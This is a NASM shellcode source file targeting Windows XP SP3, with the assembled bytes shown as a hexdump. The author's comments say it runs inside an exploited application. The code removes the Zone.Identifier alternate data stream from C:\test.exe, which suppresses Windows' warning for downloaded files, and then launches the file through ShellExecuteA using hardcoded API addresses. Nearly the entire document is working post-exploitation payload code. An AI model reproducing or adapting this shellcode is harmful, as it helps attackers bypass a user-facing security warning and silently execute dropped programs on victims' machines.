; Author: sinn3r (x90.sinner {a.t} gmail.c0m)
; Tested on Windows XP SP3
; Description:
; This shellcode will attempt to delete the Zone.Identifier ADS (it's a
; trick Microsoft uses to warn you about an exe when you try to run it),
; and then run the file using the ShellExecuteA function.
; Make sure the exploited app has the following components loaded
; (should be pretty common):
; KERNEL32, msvcrt, SHELL32

[BITS 32]

global _start

_start:

push 0x00657865
push 0x2e747365
push 0x745c3a43
xor edi, edi
mov edi, esp		; edi = "C:\test.exe"

xor esi, esi
push 0x00004154
push 0x4144243a
push 0x72656966
push 0x69746e65
push 0x64492e65
push 0x6e6f5a3a
mov esi, esp            ; edi = fork

push esi
push edi
xor eax, eax
mov eax, 0x77C46040	; msvcrt.strcat  (Windows XP SP3)
call eax

xor eax, eax
mov eax, 0x7c831ec5	; KERNEL32.DeleteFileA  (Windows XP SP3)
call eax

xor edx, edx
mov word [edi + 11], dx

push edx
push 0x6e65706f
mov edx, esp		; edx = "open"
xor eax, eax
push eax		; IsShown = NULL
push eax		; DefDir = NULL
push eax		; Parameters = NULL
push edi		; Filename
push edx		; Operation = "open"
push eax		; hwnd = NULL
mov eax, 0x7ca41150	; SHELL32.ShellExecuteA  (Windows XP SP3)
call eax

; shellcode:
; sinn3r@backtrack:~$ nasm -f bin shellexecute.asm -o shellexecute | cat shellexecute |hexdump -C |grep -v 00000066
; 00000000  68 65 78 65 00 68 65 73  74 2e 68 43 3a 5c 74 31  |hexe.hest.hC:\t1|
; 00000010  ff 89 e7 31 f6 68 54 41  00 00 68 3a 24 44 41 68  |...1.hTA..h:$DAh|
; 00000020  66 69 65 72 68 65 6e 74  69 68 65 2e 49 64 68 3a  |fierhentihe.Idh:|
; 00000030  5a 6f 6e 89 e6 56 57 31  c0 b8 40 60 c4 77 ff d0  |Zon..VW1..@`.w..|
; 00000040  31 c0 b8 c5 1e 83 7c ff  d0 31 d2 66 89 57 0b 52  |1.....|..1.f.W.R|
; 00000050  68 6f 70 65 6e 89 e2 31  c0 50 50 50 57 52 50 b8  |hopen..1.PPPWRP.|
; 00000060  50 11 a4 7c ff d0                                 |P..|..|